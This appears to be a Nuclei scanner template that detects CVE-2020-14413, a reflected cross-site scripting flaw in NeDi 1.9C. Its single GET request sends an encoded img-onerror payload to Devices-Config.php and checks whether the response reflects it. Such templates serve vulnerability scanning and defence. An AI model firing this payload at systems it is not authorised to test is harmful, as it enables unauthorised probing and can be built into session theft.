id: CVE-2020-14413

info:
  name: NeDi 1.9C - Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: NeDi 1.9C is vulnerable to cross-site scripting because of an incorrect implementation of sanitize() in inc/libmisc.php. This function attempts to escape the SCRIPT tag from user-controllable values, but can be easily bypassed, as demonstrated by an onerror attribute of an IMG element as a Devices-Config.php?sta= value.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade to a patched version of NeDi or apply the vendor-supplied patch to mitigate this vulnerability.
  reference:
    - https://gist.github.com/farid007/8db2ab5367ba00e87f9479b32d46fea8
    - https://nvd.nist.gov/vuln/detail/CVE-2020-14413
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/Elsfa7-110/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-14413
    cwe-id: CWE-79
    epss-score: 0.15743
    epss-percentile: 0.94406
    cpe: cpe:2.3:a:nedi:nedi:1.9c:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: nedi
    product: nedi
  tags: cve,cve2020,nedi,xss,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<img src=x onerror=alert(document.domain)>"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502201414bba32c017ca53b3b50a1c9f3a0957347090df7b093683d3946b4a84833ab022100cf6d3a9814c26ae3529f0a5e777dcb11b2f9100ee67f99efd75b504ba5a76aed:922c64590222798bb761d5b6d8e72950